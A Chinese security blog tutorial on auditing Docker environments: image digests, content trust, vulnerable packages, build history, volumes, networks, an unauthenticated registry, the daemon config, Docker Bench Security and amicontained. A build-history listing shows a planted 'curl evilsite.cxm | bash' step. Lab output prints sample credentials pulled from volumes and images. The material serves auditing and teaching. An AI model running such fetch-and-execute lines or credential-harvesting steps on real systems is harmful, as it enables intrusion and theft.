原创： Lee2dog 合天智汇

审计Docker容器

从安全的角度对Docker容器化环境进行审核，涉及识别部署和运行时的错误配置。审核docker容器及其运行时环境需要检查以下的组件：

  * Docker images  

  * Docker containers  

  * Docker networks  

  * Docker registeries  

  * Docker volumes  

  * Docker runtime  

在本节中，我们将探讨允许安全审计人员在Docker容器化环境中进行有效地执行安全审计的工具和技术。

前情提要

![v2-8cd9fec046004028facd6bcc910b92c5_hd.j](https://pic2.zhimg.com/80/v2-8cd9fec046004028facd6bcc910b92c5_hd.jpg)

攻击和审计Docker容器02 攻击和审计Docker容器01

## 一、审计Docker 镜像和容器  

我们可以执行多项检查来对镜像和容器进行审计。容器只不过正在运行的镜像实例。我们可以查看镜像的配置和选项，以查找问题和错误配置。

1.1 检查校验和

命令：docker images --digests <image_name>

student@debian:~$ docker images --digests ubuntuREPOSITORY TAG DIGEST IMAGE ID
CREATED SIZEubuntu latest
sha256:3f119dc0737f57f704ebecac8a6d8477b0f6ca1ca0332c7ee1395ed2c6a82be7
735f80812f90 15 months ago 83.5MBubuntu <none>
sha256:e7326dd576fefaa0a478a1826df1d122d565948fd792a6dafa0313496d2dd6f0
71aa5f3f90dc 3 years ago 118MBstudent@debian:~$

1.2 通过内容信任机制获取签名

默认情况下，内容信任机制是关闭的，需要设置DOCKER_CONTENT_TRUST环境变量为1开启它。

使用 docker trust 命令语法检查镜像颁发者

student@debian:~$ docker trust inspect mediawiki --pretty Signatures for
mediawiki SIGNED TAG DIGEST SIGNERS1.27
2c46c500b7191763b30b0a51cbed87d143eac53cec979ce4225e96d1f33e6b51 (Repo
Admin)1.27.3 0759087555cbbad8531167c2fa7575b94bae1e226321449480ecb3ea71ba5adf
(Repo Admin)1.27.4
dc793a0cfcf54ec59f126a90e7b37c4e5edfd0559d6a83eccb38b9f25b246041 (Repo
Admin)1.27.5 4d27850cae1b3c6ed490ff470f16bd006801dcced3f0e51abe0d188c623a037b
(Repo Admin)1.27.6
ec941821da2c6e1e33ffcbfde44dd1cfdcdc7d966dc7cbee52560c6b493e9e0e (Repo
Admin)1.27.7 2c46c500b7191763b30b0a51cbed87d143eac53cec979ce4225e96d1f33e6b51
(Repo Admin)

1.3 查找已知漏洞

dockerhub中的镜像大部分都是使用的基础镜像，如果这些镜像没有及时更新的话，则可能存在已知的漏洞。

我们可以使用 docker hub 仓库扫描，clair（容器静态安全漏洞分析工具）来检查镜像中是否存在漏洞。

使用vulners audit检测老旧的docker镜像是否有漏洞

![v2-4e1b852656a779ce248e837f0d0e18bc_hd.j](https://pic2.zhimg.com/80/v2-4e1b852656a779ce248e837f0d0e18bc_hd.jpg)

  * Vulners audit工具能帮你轻松的检测操作系统中是否存在易受攻击的软件包。选择操作系统类型，版本，然后提交已安装软件包的列表，以查找哪些软件容易受到攻击 。  

student@debian:~$ docker run --rm -it 71aa5f3f90dc bashroot@b1381dd36f2d:/#
cat /etc/issueUbuntu Xenial Xerus (development branch) \n
\lroot@b1381dd36f2d:/# dpkg-query -W -f='${Package} ${Version}
${Architecture}\n'adduser 3.113+nmu3ubuntu4 allapt 1.1.10 amd64base-files
9.4ubuntu3 amd64base-passwd 3.5.39 amd64bash 4.3-14ubuntu1 amd64bsdutils
1:2.27.1-1ubuntu3 amd64coreutils 8.23-4ubuntu2 amd64dash 0.5.7-4ubuntu2
amd64debconf 1.5.58ubuntu1 all

把获取的软件列表，粘贴到vulners中进行漏洞检测

![v2-96711e33e7f79591f3a2e0aa2f1a9fb2_hd.j](https://pic2.zhimg.com/80/v2-96711e33e7f79591f3a2e0aa2f1a9fb2_hd.jpg)

![v2-b5d0c287d94eb3a4e1b3f84e09e2b1c8_hd.j](https://pic4.zhimg.com/80/v2-b5d0c287d94eb3a4e1b3f84e09e2b1c8_hd.jpg)

然后你可以点HOW TO Fix 查看修复指导。

1.4 检查元数据、安全和环境变量配置

可以执行docker inspect来检查这些数据

docker inspect <image_name>docker inspect <container_name>

1.5 检查镜像构建历史

使用 docker history来检查

student@debian:~$ docker history custom-htopIMAGE CREATED CREATED BY SIZE
COMMENT5aed0e1b7a7b 15 months ago /bin/sh -c #(nop) CMD ["htop"] 0B
87b65d2afa9c 15 months ago /bin/sh -c echo "curl evilsite.cxm | bash" 0B
70bc108c1ca4 15 months ago /bin/sh -c apk --no-cache add htop 2.79MB
7c515b0b913d 15 months ago /bin/sh -c #(nop) LABEL MAINTAINER=Madhu Ak… 0B
11cd0b38bc3c 16 months ago /bin/sh -c #(nop) CMD ["/bin/sh"] 0B <missing> 16
months ago /bin/sh -c #(nop) ADD file:25f61d70254b9807a… 4.41MB
student@debian:~$

## 二、审计Docker数据卷和网络  

2.1 列出并检查docker数据卷

1、列出数据卷

student@debian:~$ docker volume lsDRIVER VOLUME NAMElocal
1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67local
9159b373c0d298cb2fdc2bfe1c2f650e8a115d8c54fa4c94106b8f9405c20526local
d9af2c81173f9a49ffa343d8f195bc03578cff8b5690c498acbb9bedfc0168eblocal
wordpress_db_datastudent@debian:~$

2、检验数据卷

student@debian:~$ docker volume inspect
1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67[ {
"CreatedAt": "2018-07-31T23:16:18+05:30", "Driver": "local", "Labels": null,
"Mountpoint":
"/var/lib/docker/volumes/1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67/_data",
"Name": "1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67",
"Options": null, "Scope": "local" }]student@debian:~$

3、查找敏感信息

student@debian:~$ sudo -i root@debian:~# cd
/var/lib/docker/volumes/1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67/_data/root@debian:/var/lib/docker/volumes/1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67/_data#
lsindex.php wp-activate.php wp-comments-post.php wp-content wp-links-opml.php
wp-mail.php wp-trackback.phplicense.txt wp-admin wp-config.php wp-cron.php wp-load.php wp-settings.php xmlrpc.phpreadme.html wp-blog-header.php wp-config-sample.php wp-includes wp-login.php wp-signup.phproot@debian:/var/lib/docker/volumes/1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67/_data#
grep -i 'flag' wp-config.php #### FLAG =
ae984bd8ecc6ec916f808586root@debian:/var/lib/docker/volumes/1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67/_data#
grep -i 'password' wp-config.php /** MySQL database password
*/define('DB_PASSWORD',
'ComplicatedPassword');root@debian:/var/lib/docker/volumes/1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67/_data#

> 数据卷可以使用只读，读写模式  
>

3.1 列出并检查docker网络

默认情况下，我们使用docker集群或docker compose时，docker会创建它自己的网络命名空间。

默认情况下，有 bridge，host，null 三种网络模式可用

1、 列出网络

student@debian:~$ docker network lsNETWORK ID NAME DRIVER SCOPEad816ae1f31a
bridge bridge local208a8324cfc4 docker_gwbridge bridge localf2e1e0c88ec1 host
host local2035d107fc5a none null local068b477b3311 wordpress_default bridge
localstudent@debian:~$

2、检验网络

student@debian:~$ docker inspect wordpress_default[ { "Name":
"wordpress_default", "Id":
"068b477b3311309905427ceb723f9bc7b23137163fa0c75b9ef02bc2e40eddb4", "Created":
"2018-08-01T16:32:13.813271613+05:30", "Scope": "local", "Driver": "bridge",
"EnableIPv6": false, "IPAM": { "Driver": "default", "Options": null, "Config":
[ { "Subnet": "172.20.0.0/16", "Gateway": "172.20.0.1" } ]

> 我们可用nmap或nc来执行扫描和信息收集  
>

## 三、审计Docker仓库  

Docker仓库用于Docker镜像的存储，分发。里面有许多不同的镜像，每个镜像可能有多个标签和版本。默认情况下，docker仓库的开放端口是5000，并且没有认证和加密。

我们将使用一个未授权的docker私有仓库来执行安全审计。

3.1 检查仓库状态

student@debian:~$ curl -s http://localhost:5000/v2/_catalog | jq .{
"repositories": [ "devcode", "hello-world" ]}student@debian:~$

3.2 获取镜像信息

student@debian:~$ curl -s http://localhost:5000/v2/devcode/tags/list | jq .{
"name": "devcode", "tags": [ "latest" ]}student@debian:~$

3.3 下载镜像

student@debian:~$ docker pull localhost:5000/devcode:latestlatest: Pulling
from devcode8e3ba11ec2a2: Already exists 8860a1621cb6: Pull complete Digest:
sha256:5b9705ef4f3e7070c077c7999269e80dfc850bed4e3608c80399e9547ee72039Status:
Downloaded newer image for localhost:5000/devcode:lateststudent@debian:~$

3.4 检查容器里面的敏感数据

student@debian:~$ docker run --rm -it localhost:5000/devcode:latest sh/ # cat
/.aws/credentials[default]aws_access_key_id =
AKIAAAAAAAAAAAAAAAAAaws_secret_access_key =
tVPcoIfIXifVRdmXL8fslGI7HCAtVPcoIfIa+323/ #

3.5 检查docker daemon 默认配置

查看docker运行时默认用户名和仓库

student@debian:~$ clearstudent@debian:~$ docker system infoName:
debianRegistry: https://index.docker.io/v1/Labels:Experimental: falseInsecure
Registries: 127.0.0.0/8student@debian:~$

3.6 查看仓库配置表

获取凭证信息

cat ~/.docker/config.json

![v2-6119cc673d836190e02dda3c3c2e9275_hd.j](https://pic3.zhimg.com/80/v2-6119cc673d836190e02dda3c3c2e9275_hd.jpg)

## 四、审计Docker运行环境和终端  

4.1 检查docker daemon配置

student@debian:~$ docker infoContainers: 6 Running: 6 Paused: 0 Stopped:
0Images: 17Server Version: 18.06.0-ceStorage Driver: overlay2 Backing
Filesystem: extfs Supports d_type: true Native Overlay Diff: trueLogging
Driver: json-fileCgroup Driver: cgroupfsPlugins: Volume: local Network: bridge
host macvlan null overlay Log: awslogs fluentd gcplogs gelf journald json-file
logentries splunk syslogSwarm: inactiveRuntimes: runcDefault Runtime: runcInit
Binary: docker-initcontainerd version:
d64c661f1d51c48782c9cec8fda7604785f93587runc version:
69663f0bd4b60df09991c08812a60108003fa340init version: fec3683Security Options:
apparmor seccomp Profile: defaultKernel Version: 4.4.0-116-genericOperating
System: Ubuntu 16.04.5 LTSOSType: linuxArchitecture: x86_64CPUs: 1Total
Memory: 992.2MiBName: debianID:
IES2:63C3:4DEK:G6HC:KHB4:R2DX:4VAQ:HEWN:OVK7:UZ56:IJZH:TRREDocker Root Dir:
/var/lib/dockerDebug Mode (client): falseDebug Mode (server): falseRegistry:
https://index.docker.io/v1/Labels:Experimental: falseInsecure Registries:
127.0.0.0/8Live Restore Enabled: false WARNING: No swap limit
supportstudent@debian:~$

主要审计这些内容：

![v2-d52a8516440ce30379a611fd237ce38a_hd.j](https://pic3.zhimg.com/80/v2-d52a8516440ce30379a611fd237ce38a_hd.jpg)

![v2-366127fe4d5576995442728a88a3ef26_hd.j](https://pic3.zhimg.com/80/v2-366127fe4d5576995442728a88a3ef26_hd.jpg)

4.2 查看事件

查看docker 运行时产生的全局事件(实时日志)

student@debian:~$ docker system events 2019-11-18T13:52:59.537588194+05:30
container kill
3e461d4c687914e06c790f0160420da068384b41b4fc57b3b54ecaf7becf3d12
(image=nginx:alpine, maintainer=NGINX Docker Maintainers <docker-maint@nginx.com>, name=samplewebapp2,
signal=15)2019-11-18T13:53:00.230169002+05:30 container die
3e461d4c687914e06c790f0160420da068384b41b4fc57b3b54ecaf7becf3d12 (exitCode=0,
image=nginx:alpine, maintainer=NGINX Docker Maintainers <docker-maint@nginx.com>, name=samplewebapp2)2019-11-18T13:53:00.278895211+05:30
network disconnect
ad816ae1f31af2f3348edb3241952207844cbcda1fad7d5d4e94606b4d1ffca3
(container=3e461d4c687914e06c790f0160420da068384b41b4fc57b3b54ecaf7becf3d12,
name=bridge, type=bridge)2019-11-18T13:53:00.355323063+05:30 container stop
3e461d4c687914e06c790f0160420da068384b41b4fc57b3b54ecaf7becf3d12
(image=nginx:alpine, maintainer=NGINX Docker Maintainers <docker-maint@nginx.com>, name=samplewebapp2)2019-11-18T13:53:00.391660783+05:30
container destroy
3e461d4c687914e06c790f0160420da068384b41b4fc57b3b54ecaf7becf3d12
(image=nginx:alpine, maintainer=NGINX Docker Maintainers <docker-maint@nginx.com>, name=samplewebapp2)

4.3 检查暴露的API端口

检查API端口是否暴露在0.0.0.0

ctf@debian:~$ sudo cat /lib/systemd/system/docker.service
[Unit]Description=Docker Application Container
EngineDocumentation=https://docs.docker.comAfter=network-online.target
docker.socket firewalld.serviceWants=network-online.targetRequires=docker.socket [Service]Type=notify# the default is not
to use systemd for cgroups because the delegate issues still# exists and
systemd currently does not support the cgroup feature set required# for
containers run by docker#ExecStart=/usr/bin/dockerd -H
fd://ExecStart=/usr/bin/dockerd -H fd:// -H
tcp://0.0.0.0:2375ExecReload=/bin/kill -s HUP $MAINPID

![v2-630c2260f1f3caeb95d1d9da8c8125d4_hd.j](https://pic4.zhimg.com/80/v2-630c2260f1f3caeb95d1d9da8c8125d4_hd.jpg)

4.4 检查docker socket安全

检查docker socket是否被挂载到容器中

student@debian:~$ docker inspect portainer | grep -i '/var/run/'
"/var/run/docker.sock:/var/run/docker.sock", "Source": "/var/run/docker.sock",
"Destination": "/var/run/docker.sock", "SandboxKey":
"/var/run/docker/netns/69e44b98856e",student@debian:~$

4.5 检查其他文件和数据

student@debian:~$ sudo ls -l /var/lib/docker/total 64drwx------ 2 root root
4096 Jul 31 2018 builderdrwx------ 4 root root 4096 Jul 31 2018
buildkitdrwx------ 3 root root 4096 Jul 31 2018 containerddrwx------ 7 root
root 4096 Nov 18 13:53 containersdrwx------ 3 root root 4096 Jul 31 2018
imagedrwxr-x--- 3 root root 4096 Jul 31 2018 networkdrwx------ 72 root root
16384 Nov 18 13:53 overlay2drwx------ 4 root root 4096 Jul 31 2018
pluginsdrwx------ 2 root root 4096 Nov 14 22:09 runtimesdrwx------ 2 root root
4096 Aug 1 2018 swarmdrwx------ 2 root root 4096 Nov 15 15:04 tmpdrwx------ 2
root root 4096 Jul 31 2018 trustdrwx------ 6 root root 4096 Nov 15 08:37
volumesstudent@debian:~$

## 五、Docker完整性检查  

我们可用对容器内文件系统中文件和目录修改进行审计。使用diff选项对以下三种行为事件进行审计：

  * A-Add  

  * D-Delete  

  * C-Change  

5.1 示例

运行一个容器，并执行一些更改

student@debian:~$ docker run --name checkintegriy -it ubuntu:latest
bashroot@662582e16f84:/# mkdir -p /data/outputroot@662582e16f84:/# echo
"modifed this stuff" > /.dockerenvroot@662582e16f84:/#
exitexitstudent@debian:~$

使用diff选项查看更改

student@debian:~$ docker diff checkintegriyC /rootA /root/.bash_historyC
/.dockerenvA /dataA /data/outputstudent@debian:~$

## 六、使用Docker Bench Security 进行审计  

Docker Bench
Security是一个Docker官方出品的用来对Docker容器生产环境执行安全检查的Shell脚本。这些测试都是自动化的，其灵感来自CIS
Docker基准。

更多详情请查看： GitHub - docker/docker-bench-security: The Docker Bench for Security
is a script that checks for dozens of common best-practices around deploying
Docker containers in production. https://github.com/docker/docker-bench-security

脚本会执行的6项主要检查：

1、主机配置

2、Docker daemon配置文件

3、Docker容器镜像

4、Docker运行环境

5、Docker安全运维

6、Docker集群配置

6.1 运行Docker bench security

执行脚本进行审核

student@debian:/opt/docker-bench-security$ sudo bash docker-bench-security.sh#
------------------------------------------------------------------------------#
Docker Bench for Security v1.3.4## Docker, Inc. (c) 2015-## Checks for dozens
of common best-practices around deploying Docker containers in production.#
Inspired by the CIS Docker Community Edition Benchmark v1.1.0.#
------------------------------------------------------------------------------Initializing Mon Nov 18 14:26:16 IST 2019 [INFO] 1 - Host Configuration[WARN]
1.1 - Ensure a separate partition for containers has been created[NOTE] 1.2 -Ensure the container host has been Hardened[INFO] 1.3 - Ensure Docker is up to
date[INFO] * Using 18.06.0, verify is it up to date as deemed necessary[INFO]
* Your operating system vendor may provide support and security maintenance
for Docker[INFO] 1.4 - Ensure only trusted users are allowed to control Docker
daemon[INFO] * docker:x:999:student[WARN] 1.5 - Ensure auditing is configured
for the Docker daemon

## 七、使用amicontained进行安全审计  

### Container自检(Introspection)工具，能找出正在使用的容器运行环境以及可用的功能。  

7.1 运行无特权容器

student@debian:~$ docker run --rm -it r.j3ss.co/amicontained -dContainer
Runtime: dockerHas Namespaces: pid: true user: falseAppArmor Profile: docker-default (enforce)Capabilities: BOUNDING -> chown dac_override fowner fsetid
kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod
audit_write setfcapChroot (not pivot_root): falseSeccomp:
filteringstudent@debian:~$

7.2 以主机特权运行容器

student@debian:~$ docker run --rm -it --pid host r.j3ss.co/amicontained
-dContainer Runtime: dockerHas Namespaces: pid: false user: falseAppArmor
Profile: docker-default (enforce)Capabilities: BOUNDING -> chown dac_override
fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot
mknod audit_write setfcapChroot (not pivot_root): falseSeccomp:
filteringstudent@debian:~$

7.3 添加安全选项运行

student@debian:~$ docker run --rm -it --security-opt "apparmor=unconfined"
r.j3ss.co/amicontained -dContainer Runtime: dockerHas Namespaces: pid: true
user: falseAppArmor Profile: unconfinedCapabilities: BOUNDING -> chown
dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw
sys_chroot mknod audit_write setfcapChroot (not pivot_root): falseSeccomp:
filteringstudent@debian:~$

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

